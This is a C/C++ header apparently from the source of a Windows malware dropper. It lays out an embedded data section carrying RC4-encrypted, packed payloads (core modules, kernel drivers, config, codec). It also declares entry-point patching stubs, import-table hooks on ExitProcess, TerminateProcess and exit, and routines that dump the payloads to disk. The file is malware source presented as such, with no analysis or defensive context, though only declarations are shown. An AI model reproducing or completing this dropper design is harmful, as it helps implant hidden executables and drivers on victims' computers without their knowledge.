#ifndef _DROPPERCODE_H
#define _DROPPERCODE_H

#include <string>
using namespace std;

#include "common.h"
#include "smc.h"

#ifdef WIN32
#define ALIGN4 __declspec(align(4))
#else
#define ALIGN4 __attribute__((packed, aligned(4)))
#endif

#define HOOKSLEEPTIME 5

enum {
	DATASECTION_ENDMARKER = 0x3E453C00,
};

enum {
	OEPSTUBSIZE = 31,
	ADDRBYTE1 = 6,
	ADDRBYTE2 = 5,
	ADDRBYTE3 = 8,
	ADDRBYTE4 = 10,
};

extern BYTE oepStub[OEPSTUBSIZE];

// STRINGS indexes

#define STRIDX_EXECUTABLE_NAME	0
#define STRIDX_INSTALL_DIR		1
#define STRIDX_TMP_ENVVAR		2
#define STRIDX_TEMP_ENVVAR		3
#define STRIDX_KERNEL32_DLL     4
#define STRIDX_MSVCRT_DLL		5
#define STRIDX_LOADLIBRARYA		6
#define STRIDX_GETPROCADDRESS	7
#define STRIDX_RUNDLL			8
#define STRIDX_COMMAHFF8		9
#define STRIDX_HFF5				10
#define STRIDX_DIRSEP			11
#define STRIDX_USER32_DLL		12

#if _DEBUG
#define STRIDX_ERRORCREDIR		13
#define STRIDX_EXITPROCIDX		14
#define STRIDX_EXITPROCHOOKED   15
#define STRIDX_RESTOREOEP		16
#define STRIDX_EXITHOOKED		17
#define STRIDX_OEPRESTORED		18
#define STRIDX_CALLINGOEP		19
#define STRIDX_CREATEFILE_ERR   20
#define STRIDX_HFF5CALLING      21
#define STRIDX_HFF5CALLED	    22
#define STRIDX_INEXITPROC_HOOK  23
#define STRIDX_VECTORQUIT		24
#define STRIDX_VERIFYVERSION    25
#define STRIDX_SYSMAJORVER		26
#define STRIDX_SYSMINORVER		27
#define STRIDX_RESTORESTAGE1	28
#define STRIDX_RESTORESTAGE2	29
#define STRIDX_TERMINATEPROCESS 30
#endif

// DLL calls indexes

// KERNEL32.dll
#define	CALL_OUTPUTDEBUGSTRINGA			0
#define	CALL_CREATEFILEA				1
#define CALL_CREATEDIRECTORYA			2
#define CALL_CLOSEHANDLE				3
#define	CALL_WRITEFILE					4
#define CALL_READFILE					5
#define CALL_SETFILEPOINTER				6
#define CALL_GETMODULEFILENAMEW			7
#define	CALL_VIRTUALALLOC				8
#define CALL_VIRTUALFREE				9
#define CALL_VIRTUALPROTECT				10
#define CALL_WINEXEC					11
#define CALL_FREELIBRARY				12
#define CALL_GETENVIRONMENTVARIABLEA	13
#define CALL_SETCURRENTDIRECTORYA		14
#define CALL_SETFILEATTRIBUTESA			15
#define CALL_DEBUGACTIVEPROCESS			16
#define CALL_GETCURRENTPROCESSID		17
#define CALL_CREATETHREAD				18
#define CALL_GETTHREADCONTEXT			19
#define CALL_SETTHREADCONTEXT			20
#define CALL_GETFILESIZE				21
#define CALL_SLEEP						22
#define CALL_GETLASTERROR				23
#define CALL_EXITPROCESS				24
#define CALL_LOADLIBRARY				25
#define CALL_GETPROCADDRESS				26
#define CALL_VIRTUALQUERY				27
#define CALL_VERIFYVERSIONINFO			28
#define CALL_GETVERSIONEX				29
#define CALL_ISWOW64PROCESS				30
#define CALL_GETCURRENTPROCESS			31
#define CALL_TERMINATEPROCESS			32

// MSVCRT.dll
#define CALL_SPRINTF					33
#define CALL_EXIT						34
#define CALL__EXIT						35

// ADVAPI32.DLL
#define CALL_GETCURRENTHWPROFILE		36

// #define STRING(idx) (LPCSTR)strings[((DWORD*)stringsOffsets)[(idx)]]
#define STRING(idx) (char*)(strings + stringsOffsets[(idx)])
#define STRLEN(idx) _STRLEN_(STRING(idx))

// RC4
#define SBOX_SIZE 255
#define MAX_BUF_SIZE 1024
#define RC4KEYLEN 64

#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0)
#define RC4_CRYPT(buf, buf_len, key, key_len, header) rc4_skip((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)

typedef struct _data_section_blob {
	DWORD offset;
	DWORD size;
} DataSectionBlob;

typedef struct _patch_blob {
	DWORD VA;
	DWORD offset;
	DWORD size;
} PatchBlob;

typedef struct _data_section_cryptopack {
	DWORD offset;
	DWORD size;
	DWORD characteristics;
} DataSectionCryptoPack;

// DataSectionCryptoPack Characteristics

#define DSBCHAR_APLIB_PACKED	0x00000100
#define DSBCHAR_CRYPT_RC4		0x00001000

typedef struct _data_section_files {
	struct {
		DataSectionBlob core;
		DataSectionBlob core64;
		DataSectionBlob config;
		DataSectionBlob driver;
		DataSectionBlob driver64;
		DataSectionBlob codec;		
	} names;
	
	DataSectionCryptoPack core;
	DataSectionCryptoPack core64;
	DataSectionCryptoPack config;
	DataSectionCryptoPack driver;
	DataSectionCryptoPack driver64;
	DataSectionCryptoPack codec;
} DataSectionFiles;

typedef void (*WINSTARTFUNC)(void);
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *LOADLIBRARY)(LPCSTR);

#define JMP_OPCODE_SIZE 5

typedef ALIGN4 struct _data_section_header {

	// RC4
	// Encryption key
	CHAR rc4key[RC4KEYLEN];
	// SBox
	unsigned char gSBox[SBOX_SIZE + 1];

	// OEP
	WINSTARTFUNC   pfn_OriginalEntryPoint;
	
	// Synchronization
	DWORD synchro;

	// used to pass full qualified path to core thread
	CHAR *dllPath;
	
	// used to hook ExitProcess on Vista (Vista deletes call names from Thunks when EXE is loaded)
	struct {
		int ExitProcess;
		int TerminateProcess;
		int exit;
		int _exit;
	} hookedCalls;
	
	// our own functions
	struct {
		DataSectionBlob newEntryPoint;
		DataSectionBlob coreThread;
		DataSectionBlob dumpFile;
		DataSectionBlob exitProcessHook;
		DataSectionBlob terminateProcessHook;
		DataSectionBlob exitHook;
		DataSectionBlob rvaToOffset;
		DataSectionBlob rc4;
		DataSectionBlob hookCall;
	} functions;
	
	// strings
	DataSectionBlob stringsOffsets;
	DataSectionBlob strings;
	
	// dlls and addresses
	DataSectionBlob dlls;
	DataSectionBlob callAddresses;
	
	// appended files
	DataSectionFiles files;
	
	PatchBlob stage1;
	PatchBlob stage2;
	
	DataSectionBlob restore;
	
} DataSectionHeader;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct {
	DWORD InLoadNext;
	DWORD InLoadPrev;
	DWORD InMemNext;
	DWORD InMemPrev;
	DWORD InInitNext;
	DWORD InInitPrev;
	DWORD ImageBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;

#pragma region REQUIRED_IMPORTS

typedef BOOL (WINAPI * DUMPFILE)(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectionHeader *header);
typedef DWORD (WINAPI * THREADPROC)(LPVOID lpParameter);

typedef void (WINAPI *OUTPUTDEBUGSTRING)(LPCTSTR lpOutputString);
typedef HANDLE (WINAPI *CREATEFILE)(LPCTSTR lpFileName,
									DWORD dwDesiredAccess,
									DWORD dwShareMode,
									LPSECURITY_ATTRIBUTES lpSecurityAttributes,
									DWORD dwCreationDisposition,
									DWORD dwFlagsAndAttributes,
									HANDLE hTemplateFile);
typedef BOOL (WINAPI * CREATEDIRECTORY)(
							LPCTSTR lpPathName,
							LPSECURITY_ATTRIBUTES lpSecurityAttributes
							);
typedef BOOL (WINAPI * CLOSEHANDLE)(
								HANDLE hObject
								);
typedef BOOL (WINAPI * WRITEFILE)(
					  HANDLE hFile,
					  LPCVOID lpBuffer,
					  DWORD nNumberOfBytesToWrite,
					  LPDWORD lpNumberOfBytesWritten,
					  LPOVERLAPPED lpOverlapped
					  );
typedef DWORD (WINAPI * SETFILEPOINTER)(
									HANDLE hFile,
									LONG lDistanceToMove,
									PLONG lpDistanceToMoveHigh,
									DWORD dwMoveMethod
									);
typedef BOOL (WINAPI * READFILE)(
					 HANDLE hFile,
					 LPVOID lpBuffer,
					 DWORD nNumberOfBytesToRead,
					 LPDWORD lpNumberOfBytesRead,
					 LPOVERLAPPED lpOverlapped
					 );
typedef DWORD (WINAPI * GETMODULEFILENAME)(
									   HMODULE hModule,
									   LPTSTR lpFilename,
									   DWORD nSize
									   );
typedef LPVOID (WINAPI * VIRTUALALLOC)(
						   LPVOID lpAddress,
						   SIZE_T dwSize,
						   DWORD flAllocationType,
						   DWORD flProtect
						   );
typedef BOOL (WINAPI * VIRTUALFREE)(
								LPVOID lpAddress,
								SIZE_T dwSize,
								DWORD dwFreeType
								);
typedef BOOL (WINAPI * VIRTUALPROTECT)(
								   LPVOID lpAddress,
								   SIZE_T dwSize,
								   DWORD flNewProtect,
								   PDWORD lpflOldProtect
								   );
typedef UINT (WINAPI * WINEXEC)(
							LPCSTR lpCmdLine,
							UINT uCmdShow
							);
typedef BOOL (WINAPI * FREELIBRARY)(
								HMODULE hModule
								);
typedef DWORD (WINAPI * GETENVIRONMENTVARIABLE)(
	LPCTSTR lpName,
	LPTSTR lpBuffer,
	DWORD nSize
	);
typedef BOOL (WINAPI * SETCURRENTDIRECTORY)(
	LPCTSTR lpPathName
	);

typedef BOOL (WINAPI * SETFILEATTRIBUTES)(
									  LPCTSTR lpFileName,
									  DWORD dwFileAttributes
									  );
typedef BOOL (WINAPI * DEBUGACTIVEPROCESS)(
									   DWORD dwProcessId
									   );
typedef DWORD (WINAPI * GETCURRENTPROCESSID)(void);
typedef HANDLE (WINAPI * CREATETHREAD)(
								   LPSECURITY_ATTRIBUTES lpThreadAttributes,
								   SIZE_T dwStackSize,
								   LPTHREAD_START_ROUTINE lpStartAddress,
								   LPVOID lpParameter,
								   DWORD dwCreationFlags,
								   LPDWORD lpThreadId
								   );
typedef BOOL (WINAPI * GETTHREADCONTEXT)(
									 HANDLE hThread,
									 LPCONTEXT lpContext
									 ); 
typedef BOOL (WINAPI * SETTHREADCONTEXT)(
									 HANDLE hThread,
									 const CONTEXT *lpContext
									 );
typedef DWORD (WINAPI * GETFILESIZE)(
								 HANDLE hFile,
								 LPDWORD lpFileSizeHigh
								 );
typedef void (WINAPI * SLEEP)(DWORD dwMilliseconds);

typedef DWORD (WINAPI * GETLASTERROR)(void); 

typedef VOID (WINAPI  * EXITPROCESS)(UINT uExitCode);

typedef BOOL (WINAPI * TERMINATEPROCESS)(HANDLE hProcess, UINT uExitCode);

typedef int (*SPRINTF)(      
					 CHAR* lpOut,
					 CHAR* lpFmt,
					 ...
					 );

typedef SIZE_T (WINAPI *VIRTUALQUERY)(
								   LPCVOID lpAddress,
								   PMEMORY_BASIC_INFORMATION lpBuffer,
								   SIZE_T dwLength
								   );

typedef void (__cdecl *EXIT)(int status);

typedef void (__cdecl *_EXIT)(int status);

typedef BOOL (*VERIFYVERSIONINFO) (
							  OSVERSIONINFOEX* lpVersionInfo,
							  DWORD dwTypeMask,
							  DWORDLONG dwlConditionMask
							  );

typedef BOOL (*GETVERSIONEX)( OSVERSIONINFO* lpVersionInfo );

typedef BOOL (*GETCURRENTHWPROFILE)(
									LPHW_PROFILE_INFO lpHwProfileInfo
									);

typedef BOOL (*ISWOW64PROCESS)(HANDLE, BOOL *);

typedef HANDLE (*GETCURRENTPROCESS)(void);

typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);

typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip,
						 unsigned char *data, size_t data_len, DataSectionHeader *header);

typedef DWORD (*HOOKCALL)(char* dll, 
				 int index, 
				 DWORD hookFunc, 
				 UINT_PTR IAT_rva, 
				 DWORD imageBase, 
				 DataSectionHeader *header); 

#pragma endregion

#pragma region CUSTOM_INLINE_FUNCTIONS

// Important: Compiler must set /O2 (Maximize Speed) to ensure inline functions
// Although compiler provides #pragma intrinsic it is not 100% reliable

__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz );
__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz );
__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz );
__forceinline size_t _STRLEN_(char *_src);
__forceinline void _TOUPPER_(char *s);
__forceinline  void _TOUPPER_CHAR(char *c);
__forceinline void _TOLOWER_(char *s);
__forceinline int _STRCMP_(char *_src1, char *_src2);
__forceinline int _STRCMPI_(char *_src1, char *_src2);
__forceinline char* _STRRCHR_(char const *s, int c);
__forceinline void _STRCAT_(char*_src1, char *_src2);
__forceinline void _ZEROMEM_(char* mem, int size);
__forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD length );

#pragma endregion

// TODO change all _End function using macros

// *** Entry Point 
int __stdcall NewEntryPoint();
FUNCTION_END_DECL(NewEntryPoint);
// int __stdcall NewEntryPoint_End();

BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectionHeader* header);
FUNCTION_END_DECL(DumpFile);
// void __stdcall DumpFile_End(CHAR * fileName, CHAR* fileData, DWORD fileSize);

DWORD WINAPI CoreThreadProc(LPVOID lpParameter);
FUNCTION_END_DECL(CoreThreadProc);
// DWORD WINAPI CoreThreadProc_End(__in  LPVOID lpParameter);

VOID WINAPI ExitProcessHook(UINT uExitCode);
FUNCTION_END_DECL(ExitProcessHook);

BOOL WINAPI TerminateProcessHook(HANDLE hProcess, UINT uExitCode);
FUNCTION_END_DECL(TerminateProcessHook);

__declspec(noreturn) void __cdecl ExitHook(int status);
FUNCTION_END_DECL(ExitHook);

void rc4_skip(const unsigned char *key, size_t keylen, size_t skip,
			  unsigned char *data, size_t data_len, DataSectionHeader *header);
FUNCTION_END_DECL(rc4_skip);

DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DataSectionHeader *header); 
FUNCTION_END_DECL(hookCall);

void generate_key(std::string& key, unsigned int length);
bool dumpDropperFiles();

#endif /* _DROPPER_H */
